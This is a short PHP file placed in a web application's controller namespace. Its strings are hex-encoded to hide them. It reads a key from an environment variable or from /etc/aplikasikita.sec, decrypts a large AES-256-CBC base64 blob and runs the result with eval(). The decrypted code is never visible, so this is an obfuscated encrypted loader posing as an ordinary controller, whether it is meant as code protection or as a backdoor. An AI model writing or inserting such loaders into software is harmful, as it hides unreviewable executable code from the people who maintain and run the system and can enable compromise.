<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1fU9IMELB+HsLQLJLuWdZg==');

$c=base64_decode(

'LtZ/CPHKmhQ8rmaAkb/i9m6Nm8dJVAQP9/+g7lsfffKEhMXRQECKIpdxwPaAvvBzoXC3sc6Um/7S' .
'nBrT3fpmC/wHjSq3npwvHuxUyFUTJymlrT5xbf7FH7lIu8fu8y73ihc2HMTeUoYDYVcPOnUVy4Bq' .
'Af4PhwzDECxkXGtW2KeL/oUp/J5GlquOprdVFJk6Kp2z9Ong/8GcSkvxM5laDun2fCLg+n9nKXA8' .
'N4SIBi1Vgjqn9z7JPKrumV8I9K6uJj0b982pcjC8edhFHns3whtp2x4AUaQt/LiwNmm2KU1T0E/W' .
'd4uxyZ5QhxY+s93pECa9UGdRn89PK68Fnj/+CZgpY1FuLXWn7GF0JpVnzuT9KQYDVujNrttTtDfZ' .
'uYJIyouDe/ZjiCgwc+K7a+7NC9JU/OwtiMaKRRzVSfOjTxDxJjMfadzx6wOWe5nfLS0jHq9iiiw+' .
'jZYV1lFsrNmXP/46GxGmls32tj0WkFfHVQMtKeDdg/jXnDpd0/Sn0I7oNhXDJ6y5UWk4GLAwqp31' .
'LgKHJKGNvvS6D4jAi8WUZhPE2/iIznjUDH3YCd0mpFboQcqLTsRPv7tA6WD2jYNDs6uJNej0TPvh' .
'b7kZEIfDWp8A2x6iwm7cpWlueVd+3Onrr0Ur6ila1MHVyNGVuPJ7UkzM4RVtLSfU+pITHaD4YMtP' .
'3JZ4LUb6EF8zII1adBlHKmM+JJMGfURSofDeJrAmUqluKC/xOJ2BaanRcXbV1Zl2l2APSRg2XvzT' .
'r2LUVsE237JseZsl+oC3DCvdrBUNo5DIFOsICNpwTPO4gnEXzcJ/jxDZepNs19Uu8ODCQNGvLpiW' .
'5od4sQLGb103SPvwAl0ddcBMD629FuuddUlBdKC5KCbbtCQmbMno4cxORlkM9oxRzYH3hvyiLwVb' .
'6/BBYNJCiEK/r/GNS5WH7/NujIxBl19hlQOP+htmhI2dZfbV++tkvgEzOuALYsLHw7dPCFiQm6HO' .
'bWkc4GyH1gWhM5kj8GarqcSH12ND1xAHH+xhQkNYdGyCHLqSpmSBZ69nNnJ9QK5JZruj+SUQ0qFv' .
'O3P87ioVXc+qezBnu1/FB6jzMuFs3hiMhKKje0ANWB3P/W8SniWtRmIZs41Kz16ooLvpns5vxia7' .
'miYxXTD6eEPcEs099f6s+Y1JiMH5xpOdhGlW9RQtEewUl7xCtV/nPe4wQC64SOI05OhevkXy3wmC' .
'j6FJu6puAcZ1nsbdMfhdUfXTWpaCWJNHN83ypS6LAON72cXRKNExFYiSMCzGr6Uxhpd1L3u9SMCs' .
'6sz2EjrUIPwJYLLMowF4ISjXNIsvKq84IGZZ1vOgWhG5F5gvGUZDy6gzmO6Jqze7HkIhndV1NdeY' .
'uu6dTDvp2T4uPXAG0YjrKQz3359M5iRc/t90y2Td+pQm5Vnxuk/J3T68H92ueC7GCdFbPfErHTb2' .
'QBP6xyzz0Pscla7sa9reho7FXQ4phRGcf/oqC9OSs+yKoqd9V2qIhrKgJa2Yhb8ikN4XNIyyJoxC' .
'ulUD9Mq/MC2qaJA9cr+3RnaWSsaTnSEagEVjin2fCSMz+FYo67dqJMKJVSmlVeArL2CGDcx6anNk' .
'QjJhnJOzkl0JJOJgGJmDRuKyPQd0jQyAhO3QMs1T3EUyuSrXpqHNn+CFS1azt6T3j6YKZe+9lrbN' .
'CUo7wD33ytSACDnzx9y/ebUjH4/J9l+daUR6iFDIWzeiqQCN/ajbH6k38hkaOLuf7TaxCSTU3bIs' .
'usZOvEOwVvmCLJuFsNQkxFHlGjxJqHQbAtpVPBl1QQDVHYzyzM5+ResQdnUtddLoIcwC1qxnFil1' .
'ZSJZMmsIVfHsFd0INhsn5GmB0aDsbVQ41MdlhVNayWTdB4eN0nbGDIGWFWc0YG/p2X9mwAQRnCAV' .
'kTvJ0JeDxMsw+mPoplswonk6YI4wn3OUbd3pTllKjBF8avqAe70Q1DDx4Ms3ZGif7YkQPBvKeLWh' .
'd6squ7rrBam55xj0p4MScA/nLbFZAZ7lqr1LLolFbscVsNBfOLZWSUlOFzf60MGrTAZ1eecmJbnM' .
'vBuMzM6b4PWJtvN32UiDWf1Fxw5/bCU2NRVF5euyfdJ/tHgmjf8rBtUBY8Jrl3xrfkQU3WnzLcJe' .
'1QdM6hcADw/qs8ek74GZOEjsT6Gm2gimgXlDjpPoknlLpDWWnFECA42j6r03aNCGaCdJzkcoahar' .
'XW4UAlGLqMJpT691kD/JkNkB61YgaCXaKsZOj6vClR+ikSzvYvHUqp0jQ280DSVoM8fUGO42hz4S' .
'/cGBLpN04qSO4qBbevoaltU1di+7wfhZsVRn/kpUTeob986Fg7Bkndb+NLpKqRMRxNDvasjoSK+a' .
'v00WJK7M/Xn6NUPwk/udXbWHiIptckj4QKjVsRXs4ONkQ4SiwirzuDpMePZzmgl0uSgUQWhjqiEc' .
'815mkLvejgdY1q+d+w5wBcJd6/y9dGRvYSFrZlSjCawOqq4UYzhu9cyk6iKsDzmZyzFkiiAnwGnI' .
'2VrVBFzi54EuimZCMsvo69fSxoMHu4XuV60oGK0+nAHP2xPz1dTYbkplIeQKsDM33KyJmO5z6w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

